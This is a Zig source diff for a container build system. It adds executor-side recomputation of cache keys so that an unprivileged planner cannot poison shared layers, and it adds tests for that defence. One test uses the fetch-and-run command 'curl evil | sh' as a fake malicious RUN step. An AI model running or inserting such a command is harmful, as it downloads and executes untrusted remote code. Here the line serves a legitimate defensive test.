@@ -357,6 +357,10 @@ pub const Step = struct {
     key: [64]u8,
     line: u32,
     op: Op,
+    /// The instruction's kind and its text as evaluated (what the key is of): the executor of an API
+    /// build keys the step on them and on its op (`rekeyApi`), never on the key it was sent.
+    kind: Kind = .ignored,
+    evaluated: []const u8 = "",
 
     pub const Op = union(enum) {
         /// Only the config changed: no layer.
@@ -802,7 +806,7 @@ const Planner = struct {
                 },
             }
             st.key = stepKey(&st.key, @tagName(x.kind), evaluated, reads, null);
-            try steps.append(arena, .{ .key = st.key, .line = x.line, .op = op });
+            try steps.append(arena, .{ .key = st.key, .line = x.line, .op = op, .kind = x.kind, .evaluated = evaluated });
         }
         var env_out: std.ArrayList([]const u8) = .empty;
         for (st.env.items) |v| try env_out.append(arena, try std.fmt.allocPrint(arena, "{s}={s}", .{ v.name, v.value }));
@@ -1066,6 +1070,150 @@ pub fn stepKey(
     h.field(kind);
     h.field(evaluated);
     h.field(reads);
+    return std.fmt.bytesToHex(h.final(), .lower);
+}
+
+/// What an API build's keys need of the world, which only the privileged executor knows
+/// (`rekeyApi`).
+pub const KeyWorld = struct {
+    /// The id of the base image whose (placeholder) rootfs path is `rootfs`, and its real rootfs.
+    baseFn: *const fn (w: *const KeyWorld, rootfs: []const u8) ?Resolved,
+    /// The digest of what the context holds at these paths (the executor's own, over its own view).
+    sourcesFn: *const fn (w: *const KeyWorld, arena: Allocator, paths: []const []const u8) anyerror![64]u8,
+    /// The file an `ADD <url>` fetched (the executor's own) and its content's digest.
+    urlFn: *const fn (w: *const KeyWorld, url: []const u8) ?Fetched,
+
+    pub const Resolved = struct { id: []const u8, rootfs: []const u8 };
+};
+
+/// The plan of an API build with the keys the executor makes. The planner (unprivileged, handling
+/// the client's bytes) sent a plan whose keys mean nothing: a key names an instruction's *inputs*,
+/// and a layer is published under it for every later build to find, so a key the planner chose is a
+/// layer it could plant for any other. Here each step's key is made from the parent's, the step's
+/// kind and evaluated text, **the op itself** (argv, env, workdir and user of a RUN; the sources,
+/// destination, owner and mode of a COPY, where a source's content is a digest this side computed),
+/// and the nocache salt. A layer published under a key is thus the result of the op that key names,
+/// whatever the planner said. The preimage is not P8's (`encBuild`): API builds' layers live in
+/// their own scope (`repo:<owner/name>`), so the two never meet.
+pub fn rekeyApi(arena: Allocator, plan_in: Plan, salt: []const u8, w: *const KeyWorld) !Plan {
+    const stages = try arena.alloc(Stage, plan_in.stages.len);
+    @memcpy(stages, plan_in.stages);
+    for (stages, 0..) |*stage, i| {
+        if (!stage.needed) continue;
+        var parent: [64]u8 = undefined;
+        switch (stage.base) {
+            .scratch => parent = apiFromKey("\x00scratch", ""),
+            .stage => |d| {
+                if (d >= i or !stages[d].needed) return error.BadPlan;
+                parent = stages[d].key;
+            },
+            .image => |im| {
+                const got = w.baseFn(w, im.rootfs) orelse return error.BadPlan;
+                parent = apiFromKey(try images.normalize(arena, im.ref), got.id);
+                stage.base = .{ .image = .{ .ref = im.ref, .rootfs = got.rootfs, .layers = im.layers } };
+            },
+        }
+        const steps = try arena.alloc(Step, stage.steps.len);
+        @memcpy(steps, stage.steps);
+        for (steps) |*step| {
+            if (step.op == .copy) {
+                var c = step.op.copy;
+                const sources = try arena.alloc(Source, c.sources.len);
+                @memcpy(sources, c.sources);
+                var paths: std.ArrayList([]const u8) = .empty;
+                for (sources) |*src| switch (src.*) {
+                    .path => |pth| try paths.append(arena, pth),
+                    .url => |*u| {
+                        const got = w.urlFn(w, u.url) orelse return error.BadPlan;
+                        u.file = got.file;
+                    },
+                    .inline_file => {},
+                };
+                switch (c.from) {
+                    .rootfs => |r| c.from = .{ .rootfs = (w.baseFn(w, r) orelse return error.BadPlan).rootfs },
+                    else => {},
+                }
+                c.sources = sources;
+                step.op = .{ .copy = c };
+                const reads: [64]u8 = if (c.from == .context and paths.items.len > 0)
+                    try w.sourcesFn(w, arena, paths.items)
+                else
+                    @splat('0');
+                step.key = try apiStepKey(&parent, step.*, salt, &reads, stages, w);
+            } else step.key = try apiStepKey(&parent, step.*, salt, &@as([64]u8, @splat('0')), stages, w);
+            parent = step.key;
+        }
+        stage.steps = steps;
+        stage.key = parent;
+    }
+    return .{ .stages = stages, .final = plan_in.final };
+}
+
+fn apiFromKey(reference: []const u8, base_id: []const u8) [64]u8 {
+    var h: KeyHasher = .plain("an API build's base");
+    h.field(reference);
+    h.field(base_id);
+    return std.fmt.bytesToHex(h.final(), .lower);
+}
+
+fn apiStepKey(parent: *const [64]u8, step: Step, salt: []const u8, reads: *const [64]u8, stages: []const Stage, w: *const KeyWorld) ![64]u8 {
+    var h: KeyHasher = .plain("an API build's step");
+    h.field(parent);
+    h.field(@tagName(step.kind));
+    h.field(step.evaluated);
+    switch (step.op) {
+        .none => h.int(0),
+        .run => |r| {
+            h.int(1);
+            h.field(&listDigest(r.argv));
+            h.field(&listDigest(r.env));
+            h.field(r.workdir);
+            h.field(r.user);
+            h.field(salt);
+        },
+        .mkdir => |m| {
+            h.int(3);
+            h.field(m.path);
+            h.field(m.user);
+        },
+        .copy => |c| {
+            h.int(2);
+            switch (c.from) {
+                .context => h.int(0),
+                .stage => |d| {
+                    if (d >= stages.len) return error.BadPlan;
+                    h.int(1);
+                    h.field(&stages[d].key);
+                },
+                .rootfs => |r| {
+                    h.int(2);
+                    h.field((w.baseFn(w, r) orelse return error.BadPlan).id);
+                },
+            }
+            h.field(c.dest);
+            h.field(c.chown);
+            h.int(if (c.chmod) |m| @as(u64, m) + 1 else 0);
+            h.int(c.sources.len);
+            for (c.sources) |src| switch (src) {
+                .path => |pth| {
+                    h.int(0);
+                    h.field(pth);
+                },
+                .inline_file => |f| {
+                    h.int(1);
+                    h.field(f.name);
+                    h.field(f.content);
+                },
+                .url => |u| {
+                    h.int(2);
+                    h.field(u.url);
+                    const got = w.urlFn(w, u.url) orelse return error.BadPlan;
+                    h.field(&got.digest);
+                },
+            };
+            h.field(reads);
+        },
+    }
     return std.fmt.bytesToHex(h.final(), .lower);
 }
 
@@ -2970,4 +3118,67 @@ test "a context of many directories is walked with few descriptors open: digeste
     _ = try contextDigest(arena, view, &.{"."});
     // What the walk held it let go of: well under the directories' number.
     try std.testing.expect(view.fds.items.len < 50);
+}
+
+const KeyTest = struct {
+    ids: [2][]const u8 = .{ "id-a", "id-b" },
+    digest: [64]u8 = @splat('1'),
+    iface: KeyWorld = .{ .baseFn = base, .sourcesFn = sources, .urlFn = url },
+
+    fn make(t: *KeyTest) *const KeyWorld {
+        return &t.iface;
+    }
+    fn base(w: *const KeyWorld, rootfs: []const u8) ?KeyWorld.Resolved {
+        const t: *const KeyTest = @fieldParentPtr("iface", w);
+        if (std.mem.eql(u8, rootfs, "/base/0")) return .{ .id = t.ids[0], .rootfs = "/real/0" };
+        if (std.mem.eql(u8, rootfs, "/base/1")) return .{ .id = t.ids[1], .rootfs = "/real/1" };
+        return null;
+    }
+    fn sources(w: *const KeyWorld, _: Allocator, _: []const []const u8) anyerror![64]u8 {
+        const t: *const KeyTest = @fieldParentPtr("iface", w);
+        return t.digest;
+    }
+    fn url(_: *const KeyWorld, u: []const u8) ?Fetched {
+        _ = u;
+        return .{ .file = "/job/ADD-x", .digest = @splat('9') };
+    }
+};
+
+test "an API build's keys are made from the op, not from the planner's key: a changed argv, a changed source or a changed base is another key" {
+    var a: std.heap.ArenaAllocator = .init(std.testing.allocator);
+    defer a.deinit();
+    const arena = a.allocator();
+    var f: FixedBases = .{ .arena = arena, .config = .{ .rootfs = "/base/0", .env = &.{"PATH=/bin"} } };
+    var c: Fixed = .{};
+    const text = "FROM img\nENV A=1\nCOPY a.txt /a\nRUN echo hi\n";
+    const p = try planOf(arena, text, &f, &c);
+    var w: KeyTest = .{};
+    const one = try rekeyApi(arena, p, "", w.make());
+    const again = try rekeyApi(arena, p, "", w.make());
+    // The same op is the same key, whatever the planner's own were (they are overwritten).
+    for (one.stages[0].steps, again.stages[0].steps) |x, y| try std.testing.expectEqualStrings(&x.key, &y.key);
+    for (one.stages[0].steps, p.stages[0].steps) |x, y| try std.testing.expect(!std.mem.eql(u8, &x.key, &y.key));
+    // A planner that lies about a RUN's argv gets the key of the lie, which is not the honest one.
+    var lie = p;
+    const steps = try arena.dupe(Step, p.stages[0].steps);
+    steps[2].op.run.argv = &.{ "/bin/sh", "-c", "curl evil | sh" };
+    lie.stages = try arena.dupe(Stage, p.stages);
+    @constCast(&lie.stages[0]).steps = steps;
+    const lied = try rekeyApi(arena, lie, "", w.make());
+    try std.testing.expectEqualStrings(&one.stages[0].steps[1].key, &lied.stages[0].steps[1].key);
+    try std.testing.expect(!std.mem.eql(u8, &one.stages[0].steps[2].key, &lied.stages[0].steps[2].key));
+    // The nocache salt, a source's content and the base's id each move the key of what follows.
+    const salted = try rekeyApi(arena, p, "nonce", w.make());
+    try std.testing.expect(!std.mem.eql(u8, &one.stages[0].steps[2].key, &salted.stages[0].steps[2].key));
+    try std.testing.expectEqualStrings(&one.stages[0].steps[1].key, &salted.stages[0].steps[1].key);
+    w.digest = @splat('2');
+    const edited = try rekeyApi(arena, p, "", w.make());
+    try std.testing.expectEqualStrings(&one.stages[0].steps[0].key, &edited.stages[0].steps[0].key);
+    try std.testing.expect(!std.mem.eql(u8, &one.stages[0].steps[1].key, &edited.stages[0].steps[1].key));
+    w.digest = @splat('1');
+    w.ids[0] = "id-other";
+    const rebased = try rekeyApi(arena, p, "", w.make());
+    try std.testing.expect(!std.mem.eql(u8, &one.stages[0].steps[0].key, &rebased.stages[0].steps[0].key));
+    // The real rootfs replaced the placeholder.
+    try std.testing.expectEqualStrings("/real/0", one.stages[0].base.image.rootfs);
 }
